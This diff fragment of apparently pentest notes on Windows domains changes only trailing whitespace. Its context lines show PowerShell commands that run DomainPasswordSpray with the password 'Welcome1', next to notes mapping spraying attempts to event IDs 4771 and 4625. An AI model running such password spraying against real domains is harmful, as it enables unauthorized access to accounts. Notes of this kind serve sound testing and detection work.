@@ -107,7 +107,7 @@ windows
 Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
-LDAP password spraying attempt = many instances of event ID 4771: Kerberos pre-authentication failed
+LDAP password spraying attempt = many instances of event ID 4771: Kerberos pre-authentication failed  
 SMB password spraying attempt = many instances of event ID 4625: An account failed to log on over a short period
 ### Domain Password Brute-force
 ```
